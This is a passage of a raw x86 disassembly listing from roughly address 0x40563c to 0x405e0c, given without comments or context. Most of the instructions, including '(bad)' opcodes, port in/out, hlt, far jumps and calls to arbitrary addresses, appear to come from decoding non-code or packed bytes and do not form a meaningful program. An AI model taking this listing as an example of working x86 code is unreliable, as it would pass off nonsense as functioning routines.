  40563c:	cmp    edi,DWORD PTR [edx*2-0x65450f95]
  405643:	add    edi,0x4d
  405646:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405647:	aaa    
  405648:	cmp    bh,BYTE PTR [ebp-0x1e51ab8c]
  40564e:	call   0xa66f5838
  405653:	and    eax,0xe0c5d230
  405658:	out    dx,eax
  405659:	mov    esi,0x8772733f
  40565e:	inc    edi
  40565f:	and    dh,al
  405661:	repnz push ds
  405663:	out    0x51,eax
  405665:	test   BYTE PTR [ecx+0x6a],cl
  405668:	shl    DWORD PTR [edi+eiz*8],1
  40566b:	in     al,dx
  40566c:	and    al,BYTE PTR [esi+ecx*2]
  40566f:	mov    ebx,0xb81c29c7
  405674:	in     al,0xe
  405676:	jne    0x4056c4
  405678:	gs xor al,0x5f
  40567b:	retf   
  40567c:	aaa    
  40567d:	fsub   QWORD PTR [ebx+0x67]
  405680:	xchg   DWORD PTR [edx+0x7a322ac0],ecx
  405686:	je     0x405689
  405688:	jo     0x405625
  40568a:	jae    0x4056db
  40568c:	pop    ebx
  40568d:	ins    BYTE PTR es:[edi],dx
  40568e:	stos   BYTE PTR es:[edi],al
  40568f:	inc    edi
  405690:	jmp    0x3747:0x8f9afcde
  405697:	ja     0x405679
  405699:	loope  0x4056dc
  40569b:	lds    edi,FWORD PTR [ecx+ecx*4-0x78]
  40569f:	xchg   edx,eax
  4056a0:	enter  0x122f,0xe
  4056a4:	lods   al,BYTE PTR ds:[esi]
  4056a5:	nop
  4056a6:	test   BYTE PTR [eax-0x50fde18b],cl
  4056ac:	xor    eax,0x6f944e90
  4056b1:	sbb    al,0x12
  4056b3:	sub    ah,0x20
  4056b6:	push   edi
  4056b7:	scas   al,BYTE PTR es:[edi]
  4056b8:	and    DWORD PTR [edi+0x109f197a],esp
  4056be:	inc    ebp
  4056bf:	sbb    bh,dl
  4056c1:	dec    eax
  4056c2:	pop    edi
  4056c3:	mov    ecx,0x8c93b823
  4056c8:	jbe    0x4056a2
  4056ca:	xlat   BYTE PTR ds:[ebx]
  4056cb:	in     eax,dx
  4056cc:	push   esp
  4056cd:	dec    esi
  4056ce:	xor    DWORD PTR [ecx+0x52],ebx
  4056d1:	hlt    
  4056d2:	hlt    
  4056d3:	adc    DWORD PTR [eax-0x2409427c],ebp
  4056d9:	and    dl,dl
  4056db:	mov    bl,0xbf
  4056dd:	dec    esp
  4056de:	rol    DWORD PTR [edx-0x69],1
  4056e1:	(bad)  
  4056e2:	clc    
  4056e3:	ret    0x7800
  4056e6:	rol    dh,cl
  4056e8:	jge    0x40572d
  4056ea:	cmp    edx,DWORD PTR [ecx-0x65198019]
  4056f0:	add    DWORD PTR [edi-0x1797926a],esp
  4056f6:	jmp    0x4cdf:0x15a9c2e7
  4056fd:	or     ah,BYTE PTR [edx+0x3dd2f848]
  405703:	imul   edi,DWORD PTR [esi]
  405706:	imul   esp,DWORD PTR [ecx],0xb4820a9e
  40570c:	mov    ah,0x2
  40570e:	bound  ebx,QWORD PTR [esi]
  405710:	aam    0x7f
  405712:	arpl   bx,ax
  405714:	jle    0x4056dc
  405716:	int3   
  405717:	and    BYTE PTR [edi],0x94
  40571a:	jnp    0x405782
  40571c:	jp     0x4056f1
  40571e:	or     cl,dl
  405720:	retf   
  405721:	jl     0x40571b
  405723:	push   ss
  405724:	jmp    0x4056c8
  405726:	mov    eax,ds:0x39d6a034
  40572b:	fiadd  DWORD PTR [esp+ebx*8]
  40572e:	shr    DWORD PTR [edx+0x4ff90311],0x1b
  405735:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405736:	pop    es
  405737:	mov    ds:0xcf0067eb,eax
  40573c:	call   0xe676009
  405741:	loop   0x4057c0
  405743:	call   0xbc82:0xd80732d7
  40574a:	repz mov esi,DWORD PTR gs:[esi]
  40574e:	adc    eax,edx
  405750:	imul   BYTE PTR [esp+ebx*2-0x619fe093]
  405757:	mov    eax,0xbbad0d3b
  40575c:	fcomp  QWORD PTR [edx+0x1]
  40575f:	sbb    DWORD PTR [edx],eax
  405761:	pop    es
  405762:	fbstp  TBYTE PTR [edx]
  405764:	repz push ebx
  405766:	mov    edx,0xca7fa187
  40576b:	inc    ecx
  40576c:	cmp    eax,0x2e0d2d9b
  405771:	nop
  405772:	xor    BYTE PTR [ecx+0x761b4e89],ch
  405778:	jo     0x4057a4
  40577a:	jmp    0x4f9fd325
  40577f:	in     al,dx
  405780:	adc    bh,BYTE PTR [edx]
  405782:	scas   eax,DWORD PTR es:[edi]
  405783:	enter  0xad27,0x94
  405787:	fisubr WORD PTR [edi+0x4f520816]
  40578d:	pop    ecx
  40578e:	lahf   
  40578f:	(bad)  
  405790:	test   BYTE PTR [si+0x3c],al
  405794:	push   ebx
  405795:	sub    BYTE PTR [edx-0x22],ah
  405798:	das    
  405799:	mov    ebp,0x9e338e06
  40579e:	add    BYTE PTR [edx-0x8],bh
  4057a1:	push   0xa275168c
  4057a6:	mov    bh,al
  4057a8:	test   DWORD PTR [eax],ebp
  4057aa:	inc    eax
  4057ab:	sbb    eax,DWORD PTR [ebp+0xb]
  4057ae:	popf   
  4057af:	ret    
  4057b0:	add    edi,eax
  4057b2:	lahf   
  4057b3:	retf   0x2da5
  4057b6:	and    BYTE PTR [eax+0x46],bl
  4057b9:	jmp    0x63c1a444
  4057be:	mov    ecx,0x565b72b2
  4057c3:	sbb    eax,0xdf58f42e
  4057c8:	sub    eax,0xbe524105
  4057cd:	call   0xa16d:0xc1fe5b7e
  4057d4:	rcl    BYTE PTR [ecx-0x17],0x35
  4057d8:	mov    esi,0x2ced4756
  4057dd:	imul   esp,DWORD PTR [esi+0x5197f480],0xffffff85
  4057e4:	inc    BYTE PTR [ebx-0x325ce27d]
  4057ea:	add    al,0xea
  4057ec:	sub    BYTE PTR [eax],ah
  4057ee:	out    dx,eax
  4057ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057f0:	call   0x2c0b:0xa63407b0
  4057f7:	sub    DWORD PTR [eax-0x77],edx
  4057fa:	and    esi,DWORD PTR [esi]
  4057fc:	xchg   DWORD PTR [esi-0x2],edi
  4057ff:	mov    WORD PTR [esp+edi*2],ds
  405802:	aas    
  405803:	sbb    bh,BYTE PTR [esi+0x11]
  405806:	test   DWORD PTR [edx+edi*4+0x3d],esi
  40580a:	loopne 0x405870
  40580c:	das    
  40580d:	pop    ss
  40580e:	or     DWORD PTR [ebp-0x18],esp
  405811:	repnz stos DWORD PTR es:[edi],eax
  405813:	popa   
  405814:	cld    
  405815:	(bad)  
  405817:	push   ecx
  405818:	das    
  405819:	pop    ds
  40581a:	mov    ebx,0xadfffd1c
  40581f:	push   cs
  405820:	or     edi,DWORD PTR [eax-0x26]
  405823:	dec    ebx
  405824:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405825:	adc    eax,0xfd494aff
  40582a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40582b:	mov    bl,0x75
  40582d:	ins    BYTE PTR es:[edi],dx
  40582e:	fisub  WORD PTR [esi-0x5cb96552]
  405834:	mov    eax,0x17571194
  405839:	xchg   edx,eax
  40583a:	push   0x32
  40583c:	inc    ebp
  40583d:	cwde   
  40583e:	and    al,BYTE PTR [edi-0x27196130]
  405844:	sbb    bh,BYTE PTR [ecx]
  405846:	outs   dx,BYTE PTR ds:[esi]
  405847:	pop    edx
  405848:	jle    0x4057cd
  40584a:	pop    edi
  40584b:	and    BYTE PTR [esi-0x11fa01f1],bh
  405851:	ret    0xbc25
  405854:	add    al,0xe5
  405856:	clc    
  405857:	test   BYTE PTR [eax],cl
  405859:	sti    
  40585a:	cmp    ecx,DWORD PTR [ebx]
  40585c:	mov    ch,0x21
  40585e:	mov    esi,ebp
  405860:	repz add BYTE PTR [edx+0x76],bh
  405864:	and    al,0x26
  405866:	inc    esp
  405867:	add    DWORD PTR [ebp+eiz*2+0x5eff5d19],eax
  40586e:	repz mov esp,0x14298dcb
  405874:	call   0xfc27c6cf
  405879:	mov    ds:0x2e2950c6,eax
  40587e:	ins    BYTE PTR es:[edi],dx
  40587f:	test   eax,0x13d0819c
  405884:	push   esp
  405885:	stos   BYTE PTR es:[edi],al
  405886:	xchg   ebp,eax
  405887:	push   0xb
  405889:	fiadd  WORD PTR [ebx-0x5c6e1329]
  40588f:	enter  0x192f,0xb5
  405893:	and    BYTE PTR [edx+0x4dd0447d],ah
  405899:	lds    edi,FWORD PTR cs:[edx+0x343eecdb]
  4058a0:	xchg   edx,eax
  4058a1:	mov    cl,0x4
  4058a3:	cs (bad) 
  4058a6:	dec    eax
  4058a7:	out    dx,eax
  4058a8:	xchg   ebx,eax
  4058a9:	adc    eax,0xfcaf5dfa
  4058ae:	adc    eax,0xf63da84f
  4058b3:	std    
  4058b4:	inc    esi
  4058b5:	jno    0x405854
  4058b7:	repz mov al,ds:0xf4681b55
  4058bd:	retf   0xaa81
  4058c0:	inc    BYTE PTR [ecx]
  4058c2:	dec    di
  4058c4:	fidiv  WORD PTR [edi+0x3c0ecaa7]
  4058ca:	fs inc ecx
  4058cc:	loopne 0x4058cf
  4058ce:	mov    edi,0xeeb62b14
  4058d3:	pop    ds
  4058d4:	test   eax,0xb000ec18
  4058d9:	or     bh,dl
  4058db:	jmp    0x1758c2b0
  4058e0:	scas   al,BYTE PTR es:[edi]
  4058e1:	imul   ecx,DWORD PTR [edi],0x3c9c435c
  4058e7:	lods   al,BYTE PTR ds:[esi]
  4058e8:	and    bl,BYTE PTR [ebx]
  4058ea:	jns    0x4058d8
  4058ec:	push   esi
  4058ed:	sub    DWORD PTR [edi-0x4c34f99a],ebx
  4058f3:	out    dx,al
  4058f4:	mov    ds:0x8ade4bf7,al
  4058f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4058fa:	xchg   esp,eax
  4058fb:	jl     0x405886
  4058fd:	enter  0xcd45,0x23
  405901:	in     al,dx
  405902:	nop
  405903:	shl    bh,0x17
  405906:	fadd   DWORD PTR [ebp+0x4647441f]
  40590c:	(bad)  
  40590d:	cmp    al,BYTE PTR [ebx+0x3]
  405910:	popa   
  405911:	out    dx,eax
  405912:	out    dx,al
  405913:	pop    ebx
  405914:	loopne 0x40596b
  405916:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405917:	fsubr  QWORD PTR [ebx-0x7ad35c62]
  40591d:	inc    bl
  40591f:	call   0x7a684a6a
  405924:	xor    eax,0x6381cc99
  405929:	or     DWORD PTR [ebp-0x11898fa6],ebp
  40592f:	out    0x45,al
  405931:	dec    esi
  405932:	dec    esi
  405933:	fcomp  QWORD PTR [ebp-0x55]
  405936:	push   eax
  405937:	xor    eax,0x59399569
  40593c:	or     ebp,DWORD PTR [edx-0x7]
  40593f:	push   edx
  405940:	bound  esi,QWORD PTR [esi]
  405942:	retf   0xf2fa
  405945:	pop    ebx
  405946:	ja     0x4059bd
  405948:	sbb    al,0x1a
  40594a:	inc    eax
  40594b:	or     BYTE PTR [ecx-0x601f5df4],ah
  405951:	fwait
  405952:	loopne 0x405924
  405954:	dec    ebp
  405955:	push   0xffffffbb
  405957:	mov    BYTE PTR [ebp-0x57d9d1b7],dh
  40595d:	rol    ebp,cl
  40595f:	mov    esi,eax
  405961:	push   ebx
  405962:	fadd   DWORD PTR [eax+0x4f82a011]
  405968:	mov    ecx,0x7809971a
  40596d:	outs   dx,DWORD PTR ds:[esi]
  40596e:	cmc    
  40596f:	sti    
  405970:	jge    0x40592a
  405972:	iret   
  405973:	xlat   BYTE PTR ds:[ebx]
  405974:	scas   eax,DWORD PTR es:[edi]
  405975:	pop    eax
  405976:	iret   
  405977:	icebp  
  405978:	xor    BYTE PTR [edi],0xb4
  40597b:	pop    ss
  40597c:	mov    bl,0x89
  40597e:	sub    BYTE PTR [edi+0x41a8591a],ah
  405984:	jl     0x4059ec
  405986:	inc    ebp
  405987:	or     DWORD PTR [esi],ebp
  405989:	test   al,0xdb
  40598b:	dec    esp
  40598c:	repnz sbb esp,0x370ee3ff
  405993:	ret    0x9aab
  405996:	(bad)  
  405997:	jnp    0x405950
  405999:	xchg   esi,eax
  40599a:	jle    0x4059a5
  40599c:	cmp    ebx,DWORD PTR [edi+0x30]
  40599f:	mov    ds:0x9afa1086,eax
  4059a4:	shl    eax,0xa1
  4059a7:	mov    ah,0x10
  4059a9:	or     BYTE PTR [edx+0x5c417bf],cl
  4059af:	test   al,0xd8
  4059b1:	test   DWORD PTR [ecx+ebx*2],edx
  4059b4:	xor    DWORD PTR ds:0x2e052818,esp
  4059ba:	pusha  
  4059bb:	jg     0x405953
  4059bd:	jnp    0x40599c
  4059bf:	mov    ah,0xb7
  4059c1:	gs pop esp
  4059c3:	sub    eax,0x85b480cd
  4059c8:	bound  ecx,QWORD PTR [ebp-0x2ee642ca]
  4059ce:	sbb    al,0x7
  4059d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4059d1:	ins    BYTE PTR es:[edi],dx
  4059d2:	and    eax,0x7a8ed4ae
  4059d7:	mov    ecx,0x6e8de80f
  4059dc:	push   ss
  4059dd:	jae    0x4059dc
  4059df:	push   ds
  4059e0:	into   
  4059e1:	sbb    DWORD PTR [ecx+0x38],ebx
  4059e4:	test   BYTE PTR [esi+0x26],cl
  4059e7:	mov    edx,0x4f673c42
  4059ec:	push   esp
  4059ed:	xchg   BYTE PTR [edi+0x7bfc8e9d],ah
  4059f3:	push   cs
  4059f4:	in     eax,dx
  4059f5:	mov    bh,0x65
  4059f7:	shl    al,cl
  4059f9:	(bad)  
  4059fa:	push   0xf6c7e916
  4059ff:	imul   DWORD PTR [ebx+edi*1-0x5e9e45f3]
  405a06:	xor    eax,0xc10bc6a3
  405a0b:	aad    0x2a
  405a0d:	push   ecx
  405a0e:	scas   eax,DWORD PTR es:[edi]
  405a0f:	sub    BYTE PTR [esi],bl
  405a11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a12:	in     eax,dx
  405a13:	pop    eax
  405a14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a15:	sub    BYTE PTR [edx],dh
  405a17:	sar    BYTE PTR [esi-0x43e4132b],cl
  405a1d:	push   esp
  405a1e:	xchg   esp,eax
  405a1f:	sbb    BYTE PTR [ebx+0x4c],bl
  405a22:	int    0xc6
  405a24:	(bad)  
  405a25:	dec    ecx
  405a26:	push   ebx
  405a27:	fiadd  DWORD PTR [edx]
  405a29:	cmp    BYTE PTR [edi+0x2278d329],al
  405a2f:	mov    ah,0x17
  405a31:	rol    DWORD PTR [edi],1
  405a33:	push   ecx
  405a34:	push   ds
  405a35:	(bad)  
  405a36:	rol    BYTE PTR [ebp-0x693b02d4],cl
  405a3c:	ja     0x405a2f
  405a3e:	imul   ecx,DWORD PTR [esi-0xe],0x27282452
  405a45:	pushf  
  405a46:	and    ebx,DWORD PTR [ecx]
  405a48:	adc    BYTE PTR [esi],cl
  405a4a:	push   ds
  405a4b:	xchg   ecx,eax
  405a4c:	fmul   QWORD PTR [ecx-0x4995c62c]
  405a52:	xchg   edi,eax
  405a53:	iret   
  405a54:	add    BYTE PTR [esp+ebx*1],ah
  405a57:	dec    edx
  405a58:	cmc    
  405a59:	dec    ebx
  405a5a:	mov    eax,0x2bc75ed7
  405a5f:	dec    edx
  405a60:	(bad)  
  405a61:	mov    dl,0xd1
  405a63:	mov    gs,WORD PTR [edx]
  405a65:	jns    0x405ab2
  405a67:	mov    ebp,0xd577c09b
  405a6c:	hlt    
  405a6d:	aas    
  405a6e:	jnp    0x405ac9
  405a70:	popa   
  405a71:	sub    eax,0x1991defa
  405a76:	aam    0x96
  405a78:	mov    ch,0x41
  405a7a:	push   edi
  405a7b:	cmp    al,0x3
  405a7d:	add    BYTE PTR [edi],cl
  405a7f:	fwait
  405a80:	xor    DWORD PTR [eax],esp
  405a82:	aas    
  405a83:	rcr    bh,0x57
  405a86:	xor    al,dh
  405a88:	xlat   BYTE PTR ds:[ebx]
  405a89:	imul   edi,DWORD PTR [ecx],0x31abcee5
  405a8f:	xchg   ecx,eax
  405a90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a91:	test   al,0x95
  405a93:	adc    BYTE PTR [edi+0x22995296],ch
  405a99:	lahf   
  405a9a:	adc    BYTE PTR [ebp-0x594b006],0xc7
  405aa1:	pop    edx
  405aa2:	or     esi,DWORD PTR [edi+0x5cf4ae59]
  405aa8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405aa9:	out    0xc4,eax
  405aab:	in     eax,0x8b
  405aad:	jmp    0x1cc70c27
  405ab2:	enter  0x5943,0xfa
  405ab6:	lock ins BYTE PTR es:[edi],dx
  405ab8:	(bad)  
  405aba:	loopne 0x405a5e
  405abc:	xor    eax,0xe4a37684
  405ac1:	mov    edi,DWORD PTR [ebp+0x3]
  405ac4:	pop    ebp
  405ac5:	pusha  
  405ac6:	xchg   ebx,eax
  405ac7:	mov    ebp,0x6c037e8d
  405acc:	mov    dl,0x2a
  405ace:	(bad)  
  405acf:	xchg   edx,eax
  405ad0:	pop    es
  405ad1:	iret   
  405ad2:	and    al,0x52
  405ad4:	pop    edi
  405ad5:	lods   eax,DWORD PTR ds:[esi]
  405ad6:	repz icebp 
  405ad8:	and    DWORD PTR [ebp+eax*4-0x6d],ebx
  405adc:	push   esp
  405add:	inc    esp
  405ade:	ja     0x405b37
  405ae0:	dec    ebp
  405ae1:	div    BYTE PTR ds:0xd0c4890b
  405ae7:	pusha  
  405ae8:	jno    0x405afb
  405aea:	rcl    ch,1
  405aec:	mov    edx,DWORD PTR [edi-0x6891f52a]
  405af2:	test   ebp,esi
  405af4:	mov    ecx,DWORD PTR [di+0x42]
  405af8:	call   0x736be515
  405afd:	xchg   ecx,eax
  405afe:	pop    es
  405aff:	test   al,0x4d
  405b01:	leave  
  405b02:	mov    ds:0x382e6567,eax
  405b07:	cmovno ebp,DWORD PTR [eax-0x15]
  405b0b:	mov    ebx,0x30aa6d46
  405b10:	test   al,0x24
  405b12:	ret    
  405b13:	stos   DWORD PTR es:[edi],eax
  405b14:	xchg   esp,eax
  405b15:	xchg   ebp,eax
  405b16:	dec    ebp
  405b17:	inc    ebx
  405b18:	dec    ecx
  405b19:	xlat   BYTE PTR ds:[ebx]
  405b1a:	mov    ebp,DWORD PTR [ecx+ebp*2-0xb]
  405b1e:	hlt    
  405b1f:	adc    BYTE PTR [edx+0x634d578f],0x41
  405b26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b27:	push   ss
  405b28:	adc    ebx,DWORD PTR ds:0x6417b670
  405b2e:	not    BYTE PTR [edi+0x59e78848]
  405b34:	jge    0x9e7b4719
  405b3a:	pusha  
  405b3b:	adc    dh,al
  405b3d:	cmp    bl,BYTE PTR ds:0xeaa935d8
  405b43:	sub    al,0xcf
  405b45:	aam    0xf9
  405b47:	(bad)  [esi]
  405b49:	test   eax,0x5eecbf9c
  405b4e:	cmp    DWORD PTR [esi+0x308e2d74],esp
  405b54:	shl    BYTE PTR [ebp-0x58],cl
  405b57:	lock xchg esi,eax
  405b59:	pop    esi
  405b5a:	or     al,BYTE PTR [edi-0x1f]
  405b5d:	xor    al,0x69
  405b5f:	push   ecx
  405b60:	cmp    DWORD PTR [ebp+0x5e1b3441],ebx
  405b66:	jmp    0x405af8
  405b68:	stos   DWORD PTR es:[edi],eax
  405b69:	out    0xb0,eax
  405b6b:	mov    bl,cl
  405b6d:	outs   dx,BYTE PTR ds:[esi]
  405b6e:	jne    0xf866368b
  405b74:	popf   
  405b75:	jae    0x405bd6
  405b77:	jmp    0x405b9c
  405b79:	push   0x5ce4d580
  405b7e:	add    eax,0x877b1177
  405b83:	pop    es
  405b84:	mov    esp,0x1e4d983d
  405b89:	out    dx,eax
  405b8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b8b:	push   edx
  405b8c:	mov    WORD PTR [edi-0x5b],gs
  405b8f:	jp     0x405c01
  405b91:	mov    WORD PTR [ebp-0x6f],fs
  405b94:	pop    edi
  405b95:	or     al,0x3c
  405b97:	jmp    0x1e38:0x8f4025b3
  405b9e:	xchg   edi,eax
  405b9f:	mov    bp,0x25aa
  405ba3:	test   ah,ch
  405ba5:	dec    esi
  405ba6:	sub    DWORD PTR [ebx],ebp
  405ba8:	in     eax,dx
  405ba9:	cwde   
  405baa:	packssdw mm2,mm2
  405bad:	add    DWORD PTR [ecx+0x5f],ebp
  405bb0:	(bad)  
  405bb2:	rcl    BYTE PTR [ebp+0x4e4949a9],cl
  405bb8:	or     dl,BYTE PTR [ebx-0x42]
  405bbb:	addr16 adc eax,0xa2391203
  405bc1:	pop    ebx
  405bc2:	stos   BYTE PTR es:[edi],al
  405bc3:	das    
  405bc4:	sahf   
  405bc5:	dec    ecx
  405bc6:	mov    ebx,0x115f231
  405bcb:	adc    cl,BYTE PTR [ebx-0x3c]
  405bce:	mov    eax,ds:0x931633d5
  405bd3:	stos   DWORD PTR es:[edi],eax
  405bd4:	jb     0x405c4d
  405bd6:	mov    edx,0x908d151b
  405bdb:	sub    al,0x77
  405bdd:	aam    0x43
  405bdf:	push   ebp
  405be0:	ss int 0x72
  405be3:	pop    esp
  405be4:	mov    dh,0x8f
  405be6:	push   DWORD PTR [esi]
  405be8:	mov    ch,0xd6
  405bea:	(bad)  
  405bec:	mov    dl,0x8e
  405bee:	out    dx,eax
  405bef:	sti    
  405bf0:	call   0xb29ccdf1
  405bf5:	rcl    cl,cl
  405bf7:	xchg   esp,eax
  405bf8:	fwait
  405bf9:	and    edi,esi
  405bfb:	fadd   DWORD PTR [eax+0x12]
  405bfe:	sbb    BYTE PTR [ebp+0x2f4470c9],dh
  405c04:	push   esp
  405c05:	dec    edi
  405c06:	test   DWORD PTR [ebx+0x5f],ebx
  405c09:	dec    ebp
  405c0a:	sub    al,0x33
  405c0c:	mov    cl,0x3a
  405c0e:	xor    eax,0x3ea571c4
  405c13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c14:	lods   eax,DWORD PTR ds:[esi]
  405c15:	rcl    BYTE PTR [edi],cl
  405c17:	js     0x405bc2
  405c19:	pop    eax
  405c1a:	push   edx
  405c1b:	out    dx,al
  405c1c:	test   DWORD PTR [eax],edi
  405c1e:	add    edx,DWORD PTR [esi-0x31a84f9b]
  405c24:	ins    DWORD PTR es:[edi],dx
  405c25:	ret    0xbdd0
  405c28:	call   0xf75f0a29
  405c2d:	or     eax,0xb1831694
  405c32:	sar    BYTE PTR [ebx+0x377122df],1
  405c38:	test   DWORD PTR [ebx+0x45],0x6500a07a
  405c3f:	jbe    0x405c1c
  405c41:	fdiv   DWORD PTR [ebx-0x58]
  405c44:	retf   0xcba0
  405c47:	inc    eax
  405c48:	jo     0x405bf4
  405c4a:	push   edi
  405c4b:	fstp   TBYTE PTR [edi]
  405c4d:	push   ds
  405c4e:	push   ss
  405c4f:	mov    esi,0xe985e0c5
  405c54:	xor    DWORD PTR [edx-0x3462de91],esp
  405c5a:	bound  ebp,QWORD PTR [edi-0x35]
  405c5d:	dec    eax
  405c5e:	ins    BYTE PTR es:[edi],dx
  405c5f:	cmp    edx,DWORD PTR [edi-0x232f1f36]
  405c65:	jmp    0x1bb0600a
  405c6a:	sub    al,0xcc
  405c6c:	dec    esp
  405c6d:	push   eax
  405c6e:	fstp   TBYTE PTR [ebp+0x68]
  405c71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c72:	nop
  405c73:	or     eax,0x59a182bb
  405c78:	inc    edx
  405c79:	jmp    0xb0d86412
  405c7e:	xchg   ebp,esi
  405c80:	aad    0x5
  405c82:	in     eax,dx
  405c83:	lds    ebx,FWORD PTR [esi+0xce73d65]
  405c89:	out    dx,al
  405c8a:	inc    eax
  405c8b:	sahf   
  405c8c:	xor    al,0x94
  405c8e:	mov    ch,0xba
  405c90:	cs (bad) 
  405c92:	or     al,0x43
  405c94:	and    BYTE PTR [ebp*8-0x18cb3784],dl
  405c9b:	mov    bp,0xbefe
  405c9f:	pop    ss
  405ca0:	cs cld 
  405ca2:	inc    esp
  405ca3:	jb     0x405cba
  405ca5:	ret    
  405ca6:	mov    eax,0x66a5ba57
  405cab:	test   DWORD PTR [edi],0x8a64c06
  405cb1:	mov    al,ds:0xfe415165
  405cb6:	das    
  405cb7:	jno    0x405c9b
  405cb9:	sti    
  405cba:	cmove  eax,DWORD PTR [eax+edx*8+0x41]
  405cbf:	pop    edx
  405cc0:	add    ch,0x44
  405cc3:	mov    bh,0x5e
  405cc5:	idiv   ch
  405cc7:	xchg   DWORD PTR ds:0xa222d2ab,ecx
  405ccd:	enter  0xcecf,0x69
  405cd1:	js     0x405ce6
  405cd3:	mov    esp,0x82af74e3
  405cd8:	sub    DWORD PTR [edi],esi
  405cda:	add    al,0x4e
  405cdc:	mov    eax,0x4df2d9dc
  405ce1:	popf   
  405ce2:	aam    0x9a
  405ce4:	or     al,0xe3
  405ce6:	xchg   edx,eax
  405ce7:	(bad)  
  405ce8:	and    al,0xcf
  405cea:	(bad)  
  405ceb:	fidivr DWORD PTR [ebx-0x7d85b4ab]
  405cf1:	mov    edx,0x5fa5dbd0
  405cf6:	sbb    al,0xbc
  405cf8:	or     BYTE PTR [ecx-0x2a],al
  405cfb:	dec    ebp
  405cfc:	popa   
  405cfd:	into   
  405cfe:	pop    ebx
  405cff:	or     edi,ebx
  405d01:	push   esi
  405d02:	cli    
  405d03:	mov    ds:0x9734efa3,al
  405d08:	lahf   
  405d09:	add    DWORD PTR [esi-0x6],esi
  405d0c:	(bad)  
  405d0d:	pop    ebp
  405d0e:	not    dl
  405d10:	aad    0x9d
  405d12:	push   es
  405d13:	and    eax,0xff938f29
  405d18:	(bad)  
  405d19:	(bad)  
  405d1a:	add    bl,ah
  405d1c:	sub    BYTE PTR [esi-0x4d81c34d],ah
  405d22:	add    dh,ch
  405d24:	adc    edx,DWORD PTR [ecx]
  405d26:	xchg   ecx,eax
  405d27:	push   eax
  405d28:	mov    ds:0x65264ac9,al
  405d2d:	(bad)  
  405d2e:	jae    0x405d11
  405d30:	(bad)  
  405d31:	jbe    0x405d7a
  405d33:	push   ebp
  405d34:	xchg   DWORD PTR [edi+0x2d],edi
  405d37:	mov    ebp,0xf2ba266b
  405d3c:	fs idiv edx
  405d3f:	pop    esi
  405d40:	lds    eax,FWORD PTR [edx+0x776f427a]
  405d46:	ret    
  405d47:	in     al,dx
  405d48:	or     esp,DWORD PTR [edx-0x5a8c0d6c]
  405d4e:	push   0x7673dcea
  405d53:	shl    BYTE PTR [eax+eax*4+0x42],cl
  405d57:	mov    ds:0x485d0c02,eax
  405d5c:	pop    ebp
  405d5d:	out    0x7,eax
  405d5f:	push   esp
  405d60:	scas   al,BYTE PTR es:[edi]
  405d61:	cs jp  0x405d9e
  405d64:	lea    esi,ds:0x53d1fffc
  405d6a:	and    cl,BYTE PTR [esi-0x30]
  405d6d:	in     eax,dx
  405d6e:	xor    al,0x8f
  405d70:	cdq    
  405d71:	jbe    0x405d55
  405d73:	xor    cl,dh
  405d75:	pop    ss
  405d76:	ins    DWORD PTR es:[edi],dx
  405d77:	mov    BYTE PTR [edi+0x3171e4f2],ah
  405d7d:	(bad)  
  405d7e:	sbb    al,bl
  405d80:	loop   0x405d10
  405d82:	push   ss
  405d83:	adc    al,0x38
  405d85:	lods   eax,DWORD PTR ds:[esi]
  405d86:	push   esi
  405d87:	pop    ecx
  405d88:	push   edx
  405d89:	les    esp,FWORD PTR [esi+0x42a8090f]
  405d8f:	push   ss
  405d90:	cmp    al,0x53
  405d92:	mov    ecx,0xd5b0a60f
  405d97:	dec    ebp
  405d98:	dec    ecx
  405d99:	lods   al,BYTE PTR ds:[esi]
  405d9a:	pusha  
  405d9b:	in     eax,dx
  405d9c:	or     eax,0xde3f30c4
  405da1:	retf   0x609d
  405da4:	adc    ch,dh
  405da6:	ror    BYTE PTR [eax],0xa0
  405da9:	push   ecx
  405daa:	shl    dh,cl
  405dac:	push   cs
  405dad:	xor    ah,BYTE PTR [eax+0x58]
  405db0:	daa    
  405db1:	inc    esp
  405db2:	and    DWORD PTR [edx],0xffffffcd
  405db5:	dec    esp
  405db6:	outs   dx,BYTE PTR ds:[esi]
  405db7:	cmp    al,0xfb
  405db9:	push   edi
  405dba:	enter  0xcb48,0x61
  405dbe:	cld    
  405dbf:	sahf   
  405dc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405dc1:	and    DWORD PTR [ecx+0x66],ecx
  405dc4:	call   0x915c546d
  405dc9:	dec    eax
  405dca:	and    bh,bl
  405dcc:	sub    eax,0xaac16c1d
  405dd1:	or     DWORD PTR [ebx+edi*1+0x63],edi
  405dd5:	aaa    
  405dd6:	push   eax
  405dd7:	jl     0x405e21
  405dd9:	loop   0x405e4b
  405ddb:	mov    dh,0x37
  405ddd:	and    DWORD PTR [esi+0x11eb412a],esi
  405de3:	push   ss
  405de4:	in     eax,dx
  405de5:	(bad)  [ebp-0x5d]
  405de8:	sub    ax,0x27f0
  405dec:	jmp    0x5cc6cb11
  405df1:	push   es
  405df2:	inc    edi
  405df3:	lods   al,BYTE PTR ds:[esi]
  405df4:	cli    
  405df5:	ins    BYTE PTR es:[edi],dx
  405df6:	es sti 
  405df8:	ins    DWORD PTR es:[edi],dx
  405df9:	xchg   ecx,eax
  405dfa:	fisubr WORD PTR [edi]
  405dfc:	dec    eax
  405dfd:	lea    esi,[ecx+eax*4-0x641d1ac3]
  405e04:	lea    ebp,[esi-0x40]
  405e07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e08:	adc    bl,BYTE PTR [ecx+ebx*2+0x18]
  405e0c:	jae    0x405e2a
